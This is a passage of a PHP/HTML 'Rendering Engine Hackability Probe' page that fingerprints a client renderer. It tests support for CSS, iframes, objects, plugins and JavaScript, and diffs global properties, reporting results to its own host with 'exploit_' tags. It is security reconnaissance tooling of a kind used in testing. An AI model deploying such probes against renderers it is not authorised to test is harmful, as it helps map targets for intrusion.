<?php
$pathInfo = pathinfo($_SERVER['PHP_SELF']);
if($pathInfo['dirname'] !== '/') {
  $path = $pathInfo['dirname'] . "/";
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<link href="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/css-link.css?info_css_link" rel="StyleSheet" />
<style>@import 'http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/css-import.css?info_css_import';</style>
<script>
window.Hackability = {};	
</script>
<script>
if (!document.querySelectorAll && !document.querySelector) {
	(function () {
		var
			style = document.createStyleSheet(),
			select = function (selector, maxCount) {
				var
					all = document.all,
					l = all.length,
					i,
					resultSet = [];

				style.addRule(selector, "foo:bar");
				for (i = 0; i < l; i += 1) {
					if (all[i].currentStyle.foo === "bar") {
						resultSet.push(all[i]);
						if (resultSet.length > maxCount) {
							break;
						}
					}
				}
				style.removeRule(0);
				return resultSet;

			};
		document.querySelectorAll = function (selector) {
			return select(selector, Infinity);
		};
		document.querySelector = function (selector) {
			return select(selector, 1)[0] || null;
		};
	}());
}
</script>
<script>
if(!Object.getOwnPropertyNames) {
	Object.getOwnPropertyNames = function(obj){
		var props = [];
		for(var i in obj) {
			props.push(i);
		}
		return props;
	};
}
</script>
<meta charset="UTF-8" />
<title>Rendering Engine Hackability Probe</title>
<style>
* {
	font-family: Arial;
}
iframe, object, embed {
	border:none;
	background-color: none;
}
th {
	text-align: left;
}
td {
	border-top: 1px solid grey;
	padding-top:15px;
}
table {
	  border-collapse: collapse;
}
.render {
	position: absolute;
	left:-5000px;
}
</style>
<script>
Hackability.makeRequest = function(type) {
	try {
		var script = document.createElement('script');
		script.src = Hackability.generateRequestUrl(type);
		document.body.appendChild(script);
	} catch(e){}
}
Hackability.generateRequestUrl = function(type) {
	return "http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tick.html?"+type+'&'+(+new Date);
}
</script>
</head>
<body>
<div class="container">
    <h1>Rendering Engine Hackability Probe</h1>
    <p>This page attempts to detect what the client supports</p>
<table>
  <tr>
    <td valign=top>
    	<table>
    		<thead>
    			<tr>
    				<th colspan=2>Basic tests</th>
    			</tr>
    		</thead>
    		<tbody>
    			<tr>
    			    <td width=50 height=51 valign=top class="css-link-detection" style="color:white"><div style="color:red;">No</div><span>Yes</span></td>
    				<td valign=top>CSS link?</td>
    			</tr>
    			<tr>
    			    <td width=50 height=51 valign=top class="css-import-detection" style="color:white"><div style="color:red">No</div><span>Yes</span></td>
    				<td valign=top>CSS imports?</td>
    			</tr>
    			<tr>
    				<td width=50 height=51 valign=top><span style="color:#ffffff;display:none">No</span><span style="color:green">Yes</span></td>
    				<td valign=top>Style attributes?</td>
    			</tr>
    			<tr>
    				<td width=50 height=51 valign=top><form><input type=checkbox checked></form></td>
    				<td valign=top>Forms supported?</td>
    			</tr>
    			<noscript>
    			<tr>
    				<td class="danger" width=50 height=51 valign=top><span style="color:red">No</span></td><td valign=top>Javascript enabled?</td>
    			</tr>
    			<link href="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tick.html?info_no_javascript&<?php echo time();?>" rel="StyleSheet" />
    			</noscript>
    			<script>
    			document.write('<tr><td class="info" width=50 height=51 valign=top><span style="color:green">Yes</span></td><td valign=top>JavaScript enabled</td></tr>');
    			Hackability.makeRequest("info_javascript");
    			</script>
    			<tr>
    			    <td width=50 height=51 valign=top><img src="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>img/tick.gif?info_img&<?php echo time();?>" alt="No" style="color:red;" /></td>
    				<td valign=top>Images enabled?</td>
    			</tr>
    			<!--[if IE]>
    			<tr><td class="info" width=50 height=51 valign=top><span style="color:green">Yes</span></td><td valign=top>Conditional comments</td></tr>
    			<![endif]-->
    			<tr>
    			    <td width=50 height=51 valign=top><iframe width="51" height="50" src="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tick.html?info_iframe&<?php echo time();?>" frameborder="0"><span style="color:red">No</span></iframe></td>
    				<td valign=top>Iframes render?</td>
    			</tr>
    			<tr>
  				<td width=50 height=51 valign=top><iframe width="51" height="50" frameborder="0" srcdoc="<body style=margin:0;padding:0><span style=color:green>Yes</span></body>"></iframe></td>
    				<td valign=top>Iframe srcdoc?</td>
    			</tr>
    			<tr>
    			    <td width=50 height=51 valign=top><object width="51" height="50" type="text/html" data="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tick.html?info_object&<?php echo time();?>" style="border:none;"><span style="color:red">No</span></object></td>
    				<td valign=top>Objects render?</td>
    			</tr>
    			<tr>
    			    <td width=50 height=51 valign=top><embed width="51" height="50" type="text/html" src="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tick.html?info_embed&<?php echo time();?>" style="border:0" border="0"></embed><noembed></noembed></td>
    				<td valign=top>Embeds render?</td>
    			</tr>
    			<tr>
    				<td width=50 height=51 valign=top><object data="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tick.html?info_activex&<?php echo time();?>" width=51 height=50 classid="clsid:25336920-03F9-11cf-8FD0-00AA00686F13">
      				<span style="color:red">No</span>
      				</object>		
  				</td>
    				<td valign=top>ActiveX</td>
    			</tr>
    			<tr>
    				<td width=50 height=51 valign=top><object data="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>img/tick.swf?info_flash&<?php echo time();?>" width=11 height=10 type="application/x-shockwave-flash">
      				<param name="movie" value="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>img/tick.swf?info_flash&<?php echo time();?>" />
      				<span style="color:red">No</span>
      				</object>		
  				</td>
    				<td valign=top>Flash</td>
    			</tr>
    			<tr>
    				<td width=50 height=51 valign=top><object data="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>img/tick.pdf?info_pdf&<?php echo time();?>" width=151 height=150 type="application/pdf">
      				<span style="color:red">No</span>
      				</object>		
  				</td>
    				<td valign=top>PDF</td>
    			</tr>
    			<tr>
    				<td width=50 height=51 valign=top><applet width=151 height=150 codebase="http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>img/" code="tick.class" width=151 height=150>
      				<span style="color:red">No</span>
      				</applet>		
  				</td>
    				<td valign=top>Java</td>
    			</tr>
    		</tbody>
    	</table>
  </td>
  <td width=25>&nbsp;</td>
  <td width=1 style="border-left:1px solid #000">&nbsp;</td>
  <td width=25>&nbsp;</td>
<td valign=top>
  <table class="javascriptTests">
    		<thead>
    			<tr>
    				<th colspan=2>JavaScript tests</th>
    			</tr>
    		</thead>
    		<tbody>
    			
    		</tbody>
    	</table>
  </td>
  </tr>
</table>
</div>
<div class="render"></div>
<script>
Hackability.generateRow = function(status, text) {
	var tbody = document.querySelector('.javascriptTests tbody'), tr, td, td2;
	tr = document.createElement('tr'); 
	td = document.createElement('td');
	td.width=50;
	td.height=51;
	td.valign="top";
	if(status) {
		td.innerHTML = '<span style="color:green">Yes</span>';
	} else {
		td.innerHTML = '<span style="color:red">No</span>';
	}
	td2 = document.createElement('td');
	td2.appendChild(document.createTextNode(text));
	tr.appendChild(td);
	tr.appendChild(td2);
	tbody.appendChild(tr);
}
</script>
<script>
!function(){
  var i, j, len = navigator.plugins.length, plugins = [], compare = ['Chromium PDF Viewer','WebKit built-in PDF','Edge PDF Viewer','Shockwave Flash','Widevine Content Decryption Module','Native Client','Chrome PDF Viewer'], found = false, diff = [];
  for(i=0;i<len;i++){
     plugins.push(navigator.plugins[i].name);
  }
  for(i=0;i<plugins.length;i++) {
    found = false;
    for(j=0;j<compare.length;j++) {
       if(plugins[i] === compare[j]) {
          found = true;
       }
    }
    if(!found) {
      diff.push(plugins[i]);
    }
  }
  if(diff.length) {
    Hackability.makeRequest("exploit_plugin_difference&props="+diff.join(','));
    Hackability.generateRow(true, "Plugin difference:"+diff.join(','));
  } else {
    Hackability.makeRequest("info_plugin_difference&props=No difference");
    Hackability.generateRow(false, "Plugin difference: none");
  }
}();
</script>
<script>
!function(){
	function jsEnvironmentCheck() {
var props = 'Hackability,BluetoothUUID,BluetoothRemoteGATTService,BluetoothRemoteGATTServer,BluetoothRemoteGATTDescriptor,BluetoothRemoteGATTCharacteristic,BluetoothDevice,BluetoothCharacteristicProperties,Bluetooth,NavigationPreloadManager,PresentationReceiver,PresentationConnectionList,PaymentResponse,PaymentRequestUpdateEvent,PaymentRequest,PaymentAddress,PhotoCapabilities,MediaSettingsRange,ImageCapture,BudgetService,RTCRtpContributingSource,WritableStream,PerformancePaintTiming,onmessageerror,clipboardData,maxConnectionsPerServer,onhelp,onanimationcancel,toStaticHTML,VRStageParameters,AnimationTimeline,AnimationEffectReadOnly,CSSPseudoElement,AnimationEffectTimingReadOnly,KeyframeEffectReadOnly,KeyframeEffect,CSSTransition,CSSAnimation,AnimationPlaybackEvent,AnimationEffectTiming,GamepadAxisMoveEvent,GamepadButtonEvent,DocumentTimeline,WebKitMediaKeyNeededEvent,OverconstrainedError,OverconstrainedErrorEvent,onwebkitwillrevealbottom,onwebkitwillrevealleft,onwebkitwillrevealright,onwebkitwillrevealtop,origin,Atomics,SharedArrayBuffer,StaticRange,safari,0,1,2,3,4,5,6,7,8,9,10,11,GamepadHapticActuator,GamepadPose,VRDisplay,VRDisplayCapabilities,VRDisplayEvent,VREyeParameters,VRFieldOfView,VRFrameData,VRPose,onvrdisplayactivate,onvrdisplayblur,onvrdisplayconnect,onvrdisplaydeactivate,onvrdisplaydisconnect,onvrdisplayfocus,onvrdisplaypointerrestricted,onvrdisplaypointerunrestricted,onvrdisplaypresentchange,ondragexit,onloadend,onselectstart,ontransitioncancel,ontransitionrun,ontransitionstart,RTCDTMFSender,FileSystem,FileSystemEntry,FileSystemFileEntry,FileSystemDirectoryReader,FileSystemDirectoryEntry,WebGL2RenderingContext,RemotePlayback,WebGLVertexArrayObject,RTCDataChannel,ConstantSourceNode,BaseAudioContext,AudioScheduledSourceNode,WebAssembly,TaskAttributionTiming,PerformanceLongTaskTiming,ongotpointercapture,onlostpointercapture,ANGLE_instanced_arrays,ActiveXObject,AesGcmEncryptResult,AnalyserNode,Animation,AnimationEvent,AppBannerPromptResult,ApplePaySession,ApplicationCache,ApplicationCacheErrorEvent,Array,ArrayBuffer,Attr,Audio,AudioBuffer,AudioBufferSourceNode,AudioContext,AudioDestinationNode,AudioListener,AudioNode,AudioParam,AudioProcessingEvent,AudioStreamTrack,AudioTrack,AudioTrackList,BarProp,BatteryManager,BeforeInstallPromptEvent,BeforeLoadEvent,BeforeUnloadEvent,BhxBrowser,BhxEvent,BhxFilteredEvent,BhxWebNavigation,BhxWebRequest,BiquadFilterNode,Blob,BlobEvent,BookmarkCollection,Boolean,BroadcastChannel,ByteLengthQueuingStrategy,CDATASection,CSS,CSS2Properties,CSSCharsetRule,CSSConditionRule,CSSCounterStyleRule,CSSFontFaceRule,CSSFontFeatureValuesRule,CSSGroupingRule,CSSImportRule,CSSKeyframeRule,CSSKeyframesRule,CSSMediaRule,CSSMozDocumentRule,CSSNameSpaceRule,CSSNamespaceRule,CSSPageRule,CSSPrimitiveValue,CSSRule,CSSRuleList,CSSStyleDeclaration,CSSStyleRule,CSSStyleSheet,CSSSupportsRule,CSSValue,CSSValueList,CSSViewportRule,Cache,CacheStorage,CanvasCaptureMediaStream,CanvasCaptureMediaStreamTrack,CanvasGradient,CanvasPattern,CanvasPixelArray,CanvasRenderingContext2D,CaretPosition,ChannelMergerNode,ChannelSplitterNode,CharacterData,ClientRect,ClientRectList,ClipboardEvent,CloseEvent,CollectGarbage,CommandEvent,Comment,CompositionEvent,Console,ControlRangeCollection,Controllers,ConvolverNode,Coordinates,CountQueuingStrategy,Counter,Credential,CredentialsContainer,Crypto,CryptoKey,CryptoKeyPair,CryptoOperation,CustomElementRegistry,CustomEvent,DOMCursor,DOMError,DOMException,DOMImplementation,DOMMatrix,DOMMatrixReadOnly,DOMParser,DOMPoint,DOMPointReadOnly,DOMQuad,DOMRect,DOMRectList,DOMRectReadOnly,DOMRequest,DOMSettableTokenList,DOMStringList,DOMStringMap,DOMTokenList,DOMTransactionEvent,DataChannel,DataCue,DataTransfer,DataTransferItem,DataTransferItemList,DataView,Database,Date,Debug,DelayNode,DesktopNotification,DesktopNotificationCenter,DeviceAcceleration,DeviceLightEvent,DeviceMotionEvent,DeviceOrientationEvent,DeviceProximityEvent,DeviceRotationRate,Directory,Document,DocumentFragment,DocumentType,DragEvent,DynamicsCompressorNode,EXT_frag_depth,EXT_texture_filter_anisotropic,Element,Enumerator,Error,ErrorEvent,EvalError,Event,EventException,EventSource,EventTarget,External,FederatedCredential,File,FileError,FileList,FileReader,Float32Array,Float64Array,FocusEvent,FontFace,FontFaceSet,FontFaceSetLoadEvent,FormData,Function,GainNode,Gamepad,GamepadButton,GamepadEvent,Geolocation,GestureEvent,HTMLAllCollection,HTMLAnchorElement,HTMLAppletElement,HTMLAreaElement,HTMLAreasCollection,HTMLAttachmentElement,HTMLAudioElement,HTMLBGSoundElement,HTMLBRElement,HTMLBaseElement,HTMLBaseFontElement,HTMLBlockElement,HTMLBodyElement,HTMLButtonElement,HTMLCanvasElement,HTMLCollection,HTMLContentElement,HTMLDDElement,HTMLDListElement,HTMLDTElement,HTMLDataElement,HTMLDataListElement,HTMLDetailsElement,HTMLDialogElement,HTMLDirectoryElement,HTMLDivElement,HTMLDocument,HTMLElement,HTMLEmbedElement,HTMLFieldSetElement,HTMLFontElement,HTMLFormControlsCollection,HTMLFormElement,HTMLFrameElement,HTMLFrameSetElement,HTMLHRElement,HTMLHeadElement,HTMLHeadingElement,HTMLHtmlElement,HTMLIFrameElement,HTMLImageElement,HTMLInputElement,HTMLIsIndexElement,HTMLKeygenElement,HTMLLIElement,HTMLLabelElement,HTMLLegendElement,HTMLLinkElement,HTMLMapElement,HTMLMarqueeElement,HTMLMediaElement,HTMLMenuElement,HTMLMenuItemElement,HTMLMetaElement,HTMLMeterElement,HTMLModElement,HTMLNextIdElement,HTMLOListElement,HTMLObjectElement,HTMLOptGroupElement,HTMLOptionElement,HTMLOptionsCollection,HTMLOutputElement,HTMLParagraphElement,HTMLParamElement,HTMLPhraseElement,HTMLPictureElement,HTMLPreElement,HTMLProgressElement,HTMLQuoteElement,HTMLScriptElement,HTMLSelectElement,HTMLShadowElement,HTMLSlotElement,HTMLSourceElement,HTMLSpanElement,HTMLStyleElement,HTMLTableCaptionElement,HTMLTableCellElement,HTMLTableColElement,HTMLTableDataCellElement,HTMLTableElement,HTMLTableHeaderCellElement,HTMLTableRowElement,HTMLTableSectionElement,HTMLTemplateElement,HTMLTextAreaElement,HTMLTimeElement,HTMLTitleElement,HTMLTrackElement,HTMLUListElement,HTMLUnknownElement,HTMLVideoElement,HashChangeEvent,Headers,History,IDBCursor,IDBCursorWithValue,IDBDatabase,IDBFactory,IDBFileHandle,IDBFileRequest,IDBIndex,IDBKeyRange,IDBMutableFile,IDBObjectStore,IDBOpenDBRequest,IDBRequest,IDBTransaction,IDBVersionChangeEvent,IIRFilterNode,IdleDeadline,Image,ImageBitmap,ImageBitmapRenderingContext,ImageData,Infinity,InputDeviceCapabilities,InputEvent,InstallTrigger,Int16Array,Int32Array,Int8Array,InternalError,IntersectionObserver,IntersectionObserverEntry,Intl,Iterator,JSON,Key,KeyEvent,KeyOperation,KeyPair,KeyboardEvent,LocalMediaStream,Location,MIDIAccess,MIDIConnectionEvent,MIDIInput,MIDIInputMap,MIDIMessageEvent,MIDIOutput,MIDIOutputMap,MIDIPort,MSAssertion,MSBehaviorUrnsCollection,MSBlobBuilder,MSCSSMatrix,MSCSSProperties,MSCSSRuleList,MSCompatibleInfo,MSCompatibleInfoCollection,MSCredentials,MSCurrentStyleCSSProperties,MSEventObj,MSFIDOCredentialAssertion,MSFIDOSignature,MSFIDOSignatureAssertion,MSGesture,MSGestureEvent,MSGraphicsTrust,MSInputMethodContext,MSManipulationEvent,MSMediaKeyError,MSMediaKeyMessageEvent,MSMediaKeyNeededEvent,MSMediaKeySession,MSMediaKeys,MSMimeTypesCollection,MSPluginsCollection,MSPointerEvent,MSRangeCollection,MSSiteModeEvent,MSStream,MSStreamReader,MSStyleCSSProperties,Map,Math,MediaController,MediaDeviceInfo,MediaDevices,MediaElementAudioSourceNode,MediaEncryptedEvent,MediaError,MediaKeyError,MediaKeyEvent,MediaKeyMessageEvent,MediaKeyNeededEvent,MediaKeySession,MediaKeyStatusMap,MediaKeySystemAccess,MediaKeys,MediaList,MediaQueryList,MediaQueryListEvent,MediaRecorder,MediaSource,MediaStream,MediaStreamAudioDestinationNode,MediaStreamAudioSourceNode,MediaStreamError,MediaStreamErrorEvent,MediaStreamEvent,MediaStreamTrack,MediaStreamTrackEvent,MessageChannel,MessageEvent,MessagePort,MimeType,MimeTypeArray,MouseEvent,MouseScrollEvent,MouseWheelEvent,MutationEvent,MutationObserver,MutationRecord,NaN,NamedNodeMap,Navigator,Node,NodeFilter,NodeIterator,NodeList,Notification,NotifyPaintEvent,Number,OES_element_index_uint,OES_standard_derivatives,OES_texture_float,OES_texture_float_linear,OES_texture_half_float,OES_texture_half_float_linear,Object,OfflineAudioCompletionEvent,OfflineAudioContext,OfflineResourceList,Option,OscillatorNode,OverflowEvent,PageTransitionEvent,PaintRequest,PaintRequestList,PannerNode,PasswordCredential,Path2D,Performance,PerformanceEntry,PerformanceMark,PerformanceMeasure,PerformanceNavigation,PerformanceNavigationTiming,PerformanceObserver,PerformanceObserverEntryList,PerformanceResourceTiming,PerformanceTiming,PeriodicWave,PermissionStatus,Permissions,Plugin,PluginArray,PointerEvent,PopStateEvent,PopupBlockedEvent,Position,PositionError,Presentation,PresentationAvailability,PresentationConnection,PresentationConnectionAvailableEvent,PresentationConnectionCloseEvent,PresentationRequest,ProcessingInstruction,ProgressEvent,Promise,PromiseRejectionEvent,Proxy,PushManager,PushSubscription,PushSubscriptionOptions,RGBColor,RTCCertificate,RTCDTMFToneChangeEvent,RTCDataChannelEvent,RTCDtlsTransport,RTCDtlsTransportStateChangedEvent,RTCDtmfSender,RTCIceCandidate,RTCIceCandidatePairChangedEvent,RTCIceGatherer,RTCIceGathererEvent,RTCIceTransport,RTCIceTransportStateChangedEvent,RTCPeerConnection,RTCPeerConnectionIceEvent,RTCRtpReceiver,RTCRtpSender,RTCSessionDescription,RTCSrtpSdesTransport,RTCSsrcConflictEvent,RTCStatsProvider,RTCStatsReport,RTCTrackEvent,RadioNodeList,Range,RangeError,RangeException,ReadableStream,ReadableStreamReader,RecordErrorEvent,Rect,ReferenceError,Reflect,RegExp,Request,Response,SQLError,SQLException,SQLResultSet,SQLResultSetRowList,SQLTransaction,SVGAElement,SVGAltGlyphDefElement,SVGAltGlyphElement,SVGAltGlyphItemElement,SVGAngle,SVGAnimateColorElement,SVGAnimateElement,SVGAnimateMotionElement,SVGAnimateTransformElement,SVGAnimatedAngle,SVGAnimatedBoolean,SVGAnimatedEnumeration,SVGAnimatedInteger,SVGAnimatedLength,SVGAnimatedLengthList,SVGAnimatedNumber,SVGAnimatedNumberList,SVGAnimatedPreserveAspectRatio,SVGAnimatedRect,SVGAnimatedString,SVGAnimatedTransformList,SVGAnimationElement,SVGCircleElement,SVGClipPathElement,SVGColor,SVGComponentTransferFunctionElement,SVGCursorElement,SVGDefsElement,SVGDescElement,SVGDiscardElement,SVGDocument,SVGElement,SVGElementInstance,SVGElementInstanceList,SVGEllipseElement,SVGException,SVGFEBlendElement,SVGFEColorMatrixElement,SVGFEComponentTransferElement,SVGFECompositeElement,SVGFEConvolveMatrixElement,SVGFEDiffuseLightingElement,SVGFEDisplacementMapElement,SVGFEDistantLightElement,SVGFEDropShadowElement,SVGFEFloodElement,SVGFEFuncAElement,SVGFEFuncBElement,SVGFEFuncGElement,SVGFEFuncRElement,SVGFEGaussianBlurElement,SVGFEImageElement,SVGFEMergeElement,SVGFEMergeNodeElement,SVGFEMorphologyElement,SVGFEOffsetElement,SVGFEPointLightElement,SVGFESpecularLightingElement,SVGFESpotLightElement,SVGFETileElement,SVGFETurbulenceElement,SVGFilterElement,SVGFontElement,SVGFontFaceElement,SVGFontFaceFormatElement,SVGFontFaceNameElement,SVGFontFaceSrcElement,SVGFontFaceUriElement,SVGForeignObjectElement,SVGGElement,SVGGeometryElement,SVGGlyphElement,SVGGlyphRefElement,SVGGradientElement,SVGGraphicsElement,SVGHKernElement,SVGImageElement,SVGLength,SVGLengthList,SVGLineElement,SVGLinearGradientElement,SVGMPathElement,SVGMarkerElement,SVGMaskElement,SVGMatrix,SVGMetadataElement,SVGMissingGlyphElement,SVGNumber,SVGNumberList,SVGPaint,SVGPathElement,SVGPathSeg,SVGPathSegArcAbs,SVGPathSegArcRel,SVGPathSegClosePath,SVGPathSegCurvetoCubicAbs,SVGPathSegCurvetoCubicRel,SVGPathSegCurvetoCubicSmoothAbs,SVGPathSegCurvetoCubicSmoothRel,SVGPathSegCurvetoQuadraticAbs,SVGPathSegCurvetoQuadraticRel,SVGPathSegCurvetoQuadraticSmoothAbs,SVGPathSegCurvetoQuadraticSmoothRel,SVGPathSegLinetoAbs,SVGPathSegLinetoHorizontalAbs,SVGPathSegLinetoHorizontalRel,SVGPathSegLinetoRel,SVGPathSegLinetoVerticalAbs,SVGPathSegLinetoVerticalRel,SVGPathSegList,SVGPathSegMovetoAbs,SVGPathSegMovetoRel,SVGPatternElement,SVGPoint,SVGPointList,SVGPolygonElement,SVGPolylineElement,SVGPreserveAspectRatio,SVGRadialGradientElement,SVGRect,SVGRectElement,SVGRenderingIntent,SVGSVGElement,SVGScriptElement,SVGSetElement,SVGStopElement,SVGStringList,SVGStyleElement,SVGSwitchElement,SVGSymbolElement,SVGTRefElement,SVGTSpanElement,SVGTextContentElement,SVGTextElement,SVGTextPathElement,SVGTextPositioningElement,SVGTitleElement,SVGTransform,SVGTransformList,SVGUnitTypes,SVGUseElement,SVGVKernElement,SVGViewElement,SVGViewSpec,SVGZoomAndPan,SVGZoomEvent,Screen,ScreenOrientation,ScriptEngine,ScriptEngineBuildVersion,ScriptEngineMajorVersion,ScriptEngineMinorVersion,ScriptProcessorNode,ScrollAreaEvent,SecurityPolicyViolationEvent,Selection,ServiceWorker,ServiceWorkerContainer,ServiceWorkerMessageEvent,ServiceWorkerRegistration,Set,ShadowRoot,SharedWorker,SimpleGestureEvent,SiteBoundCredential,SourceBuffer,SourceBufferList,SpeechSynthesis,SpeechSynthesisErrorEvent,SpeechSynthesisEvent,SpeechSynthesisUtterance,SpeechSynthesisVoice,StereoPannerNode,StopIteration,Storage,StorageEvent,StorageManager,String,StyleMedia,StyleSheet,StyleSheetList,StyleSheetPageList,SubtleCrypto,Symbol,SyncManager,SyntaxError,Text,TextDecoder,TextEncoder,TextEvent,TextMetrics,TextRange,TextRangeCollection,TextTrack,TextTrackCue,TextTrackCueList,TextTrackList,TimeEvent,TimeRanges,Touch,TouchEvent,TouchList,TrackEvent,TransitionEvent,TreeWalker,TypeError,UIEvent,URIError,URL,URLSearchParams,Uint16Array,Uint32Array,Uint8Array,Uint8ClampedArray,UserMessageHandler,UserMessageHandlersNamespace,UserProximityEvent,VBArray,VTTCue,VTTRegion,ValidityState,VideoPlaybackQuality,VideoStreamTrack,VideoTrack,VideoTrackList,WEBGL_compressed_texture_s3tc,WEBGL_debug_renderer_info,WEBGL_depth_texture,WaveShaperNode,WeakMap,WeakSet,WebGLActiveInfo,WebGLBuffer,WebGLContextEvent,WebGLFramebuffer,WebGLObject,WebGLProgram,WebGLQuery,WebGLRenderbuffer,WebGLRenderingContext,WebGLSampler,WebGLShader,WebGLShaderPrecisionFormat,WebGLSync,WebGLTexture,WebGLTransformFeedback,WebGLUniformLocation,WebKitAnimationEvent,WebKitCSSFilterValue,WebKitCSSMatrix,WebKitCSSRegionRule,WebKitCSSTransformValue,WebKitDataCue,WebKitDirectoryEntry,WebKitDirectoryReader,WebKitEntry,WebKitFileEntry,WebKitFileSystem,WebKitMediaKeyError,WebKitMediaKeyMessageEvent,WebKitMediaKeySession,WebKitMediaKeys,WebKitMutationObserver,WebKitNamespace,WebKitPlaybackTargetAvailabilityEvent,WebKitPoint,WebKitTransitionEvent,WebSocket,WheelEvent,Window,Worker,XMLDocument,XMLHttpRequest,XMLHttpRequestEventTarget,XMLHttpRequestProgressEvent,XMLHttpRequestUpload,XMLSerializer,XMLStylesheetProcessingInstruction,XPathEvaluator,XPathException,XPathExpression,XPathNSResolver,XPathResult,XSLTProcessor,alert,applicationCache,atob,blur,btoa,caches,cancelAnimationFrame,cancelIdleCallback,captureEvents,chrome,clearImmediate,clearInterval,clearTimeout,clientInformation,close,closed,confirm,console,content,createImageBitmap,crypto,customElements,decodeURI,decodeURIComponent,defaultStatus,defaultstatus,devicePixelRatio,doNotTrack,document,dump,encodeURI,encodeURIComponent,escape,eval,event,external,fetch,find,focus,frameElement,frames,fullScreen,getComputedStyle,getDefaultComputedStyle,getMatchedCSSRules,getSelection,history,indexedDB,innerHeight,innerWidth,isFinite,isNaN,isSecureContext,localStorage,location,locationbar,matchMedia,menubar,moveBy,moveTo,mozInnerScreenX,mozInnerScreenY,mozPaintCount,mozRTCIceCandidate,mozRTCPeerConnection,mozRTCSessionDescription,msCredentials,msWriteProfilerMark,name,navigator,netscape,offscreenBuffering,onabort,onabsolutedeviceorientation,onafterprint,onanimationend,onanimationiteration,onanimationstart,onauxclick,onbeforeprint,onbeforeunload,onblur,oncancel,oncanplay,oncanplaythrough,onchange,onclick,onclose,oncompassneedscalibration,oncontextmenu,oncuechange,ondblclick,ondevicelight,ondevicemotion,ondeviceorientation,ondeviceorientationabsolute,ondeviceproximity,ondrag,ondragend,ondragenter,ondragleave,ondragover,ondragstart,ondrop,ondurationchange,onemptied,onended,onerror,onfocus,onhashchange,oninput,oninvalid,onkeydown,onkeypress,onkeyup,onlanguagechange,onload,onloadeddata,onloadedmetadata,onloadstart,onmessage,onmousedown,onmouseenter,onmouseleave,onmousemove,onmouseout,onmouseover,onmouseup,onmousewheel,onmozfullscreenchange,onmozfullscreenerror,onmsgesturechange,onmsgesturedoubletap,onmsgestureend,onmsgesturehold,onmsgesturestart,onmsgesturetap,onmsinertiastart,onoffline,ononline,onpagehide,onpageshow,onpause,onplay,onplaying,onpointercancel,onpointerdown,onpointerenter,onpointerleave,onpointermove,onpointerout,onpointerover,onpointerup,onpopstate,onprogress,onratechange,onreadystatechange,onrejectionhandled,onreset,onresize,onscroll,onsearch,onseeked,onseeking,onselect,onshow,onstalled,onstorage,onsubmit,onsuspend,ontimeupdate,ontoggle,ontransitionend,onunhandledrejection,onunload,onuserproximity,onvolumechange,onwaiting,onwebkitanimationend,onwebkitanimationiteration,onwebkitanimationstart,onwebkitmouseforcechanged,onwebkitmouseforcedown,onwebkitmouseforceup,onwebkitmouseforcewillbegin,onwebkittransitionend,onwheel,open,openDatabase,opener,outerHeight,outerWidth,pageXOffset,pageYOffset,parent,parseFloat,parseInt,performance,personalbar,postMessage,print,prompt,releaseEvents,requestAnimationFrame,requestIdleCallback,resizeBy,resizeTo,screen,screenLeft,screenTop,screenX,screenY,scroll,scrollBy,scrollByLines,scrollByPages,scrollMaxX,scrollMaxY,scrollTo,scrollX,scrollY,scrollbars,self,sessionStorage,setImmediate,setInterval,setResizable,setTimeout,showModalDialog,sidebar,sizeToContent,speechSynthesis,status,statusbar,stop,styleMedia,toString,toolbar,top,undefined,unescape,uneval,updateCommands,webkitAudioContext,webkitAudioPannerNode,webkitCancelAnimationFrame,webkitCancelRequestAnimationFrame,webkitConvertPointFromNodeToPage,webkitConvertPointFromPageToNode,webkitIDBCursor,webkitIDBDatabase,webkitIDBFactory,webkitIDBIndex,webkitIDBKeyRange,webkitIDBObjectStore,webkitIDBRequest,webkitIDBTransaction,webkitIndexedDB,webkitMediaStream,webkitNotifications,webkitOfflineAudioContext,webkitRTCPeerConnection,webkitRequestAnimationFrame,webkitRequestFileSystem,webkitResolveLocalFileSystemURL,webkitSpeechGrammar,webkitSpeechGrammarList,webkitSpeechRecognition,webkitSpeechRecognitionError,webkitSpeechRecognitionEvent,webkitStorageInfo,webkitURL,window,length'.split(','), foundProps = Object.getOwnPropertyNames(window), i, j, diff = [], found;
		for(i=0;i<foundProps.length;i++) {
			found = false;
			for(j=0;j<props.length;j++) {
				if(foundProps[i] === props[j]) {
					found = true;
					break;
				}
			}
			if(!found) {
				diff.push(foundProps[i]);
			}
		}
		
		if(diff.length) {
			Hackability.makeRequest("exploit_js_environment_difference&props="+diff.join(','));
			Hackability.generateRow(true, "JavaScript environment difference:"+diff.join(','));
		} else {
			Hackability.makeRequest("info_js_environment_difference&props=No difference");
			Hackability.generateRow(false, "JavaScript environment difference: none");
		}
	}
	if(window.addEventListener) {
		window.addEventListener('load', function(){
			setTimeout(function() {
				jsEnvironmentCheck();
			},2000);
		},false);
	} else if(window.attachEvent) {
		window.attachEvent('onload', function(){
			setTimeout(function() {
				jsEnvironmentCheck();
